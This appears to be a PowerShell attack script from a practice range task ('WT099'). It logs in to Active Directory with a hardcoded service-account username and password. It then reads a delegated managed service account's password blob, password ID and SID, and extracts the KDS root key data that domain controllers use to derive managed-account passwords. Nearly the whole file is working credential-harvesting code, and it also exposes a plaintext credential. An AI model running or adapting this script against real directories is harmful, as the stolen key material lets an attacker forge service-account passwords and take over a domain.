# WT099 prereqs via .NET DirectoryEntry (ws01) — Rule 3 extraction only
$ErrorActionPreference = 'Continue'
$paths = @(
    'LDAP://192.168.77.12/CN=dmsaPrivService,CN=Managed Service Accounts,DC=range,DC=local',
    'LDAP://dc03.range.local/CN=dmsaPrivService,CN=Managed Service Accounts,DC=range,DC=local'
)
$user = 'range\svc_naa'
$pass = 'N@A_s3rv1c3!'
$ok = $false
foreach ($ldapPath in $paths) {
    Write-Output "=== TRY $ldapPath ==="
    try {
        $de = New-Object System.DirectoryServices.DirectoryEntry($ldapPath, $user, $pass)
        $de.RefreshCache(@('msDS-ManagedPasswordId', 'objectSid', 'msDS-ManagedPassword', 'msDS-DelegatedMSAState'))
        Write-Output ('DMSA_DN=' + $de.Path)
        if ($de.Properties['objectSid']) {
            $sid = New-Object System.Security.Principal.SecurityIdentifier($de.Properties['objectSid'][0], 0)
            Write-Output ('DMSA_SID=' + $sid.Value)
        }
        if ($de.Properties['msDS-DelegatedMSAState']) {
            Write-Output ('DMSA_STATE=' + $de.Properties['msDS-DelegatedMSAState'][0])
        }
        if ($de.Properties['msDS-ManagedPasswordId']) {
            $pwdId = [byte[]]$de.Properties['msDS-ManagedPasswordId'][0]
            Write-Output ('DMSA_PWDID_LEN=' + $pwdId.Length)
            Write-Output ('DMSA_PWDID_B64=' + [Convert]::ToBase64String($pwdId))
        }
        if ($de.Properties['msDS-ManagedPassword']) {
            $mp = [byte[]]$de.Properties['msDS-ManagedPassword'][0]
            Write-Output ('DMSA_MP_LEN=' + $mp.Length)
        }
        $ok = $true
        break
    } catch {
        Write-Output ('FAIL=' + $_.Exception.Message)
    }
}
if (-not $ok) { Write-Output 'DMSA_READ_FAILED' }

Write-Output '=== RANGE KDS root keys (dc03) ==='
$kdsBase = 'LDAP://192.168.77.12/CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,DC=range,DC=local'
try {
    $kde = New-Object System.DirectoryServices.DirectoryEntry($kdsBase, $user, $pass)
    foreach ($child in $kde.Children) {
        Write-Output ('KDS_CHILD=' + $child.Name)
        $child.RefreshCache(@('msKds-RootKeyData'))
        if ($child.Properties['msKds-RootKeyData']) {
            $blob = [byte[]]$child.Properties['msKds-RootKeyData'][0]
            Write-Output ('RANGE_ROOTKEY_BLOB_LEN=' + $blob.Length)
            Write-Output ('RANGE_ROOTKEY_HEX=' + ($blob[0..15] | ForEach-Object { '{0:X2}' -f $_ }) -join '')
        }
    }
} catch {
    Write-Output ('KDS_FAIL=' + $_.Exception.Message)
}

Write-Output 'WT099_PS_DONE'
if ($ok) { Write-Output 'T099_OK' } else { Write-Output 'T099_FAIL'; exit 1 }
